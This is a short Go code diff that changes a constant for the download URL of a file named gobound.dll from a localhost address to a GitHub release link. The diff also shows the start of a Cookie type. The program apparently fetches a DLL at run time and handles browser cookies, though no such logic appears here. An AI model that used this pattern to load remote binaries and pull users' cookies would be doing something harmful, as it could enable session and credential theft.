@@ -23,7 +23,7 @@ import (
 )
 
 const (
-	downloadURL = "http://localhost:8080/gobound.dll"
+	downloadURL = "https://github.com/carved4/gobound/releases/download/v1.0.0/gobound.dll"
 )
 
 type Cookie struct {
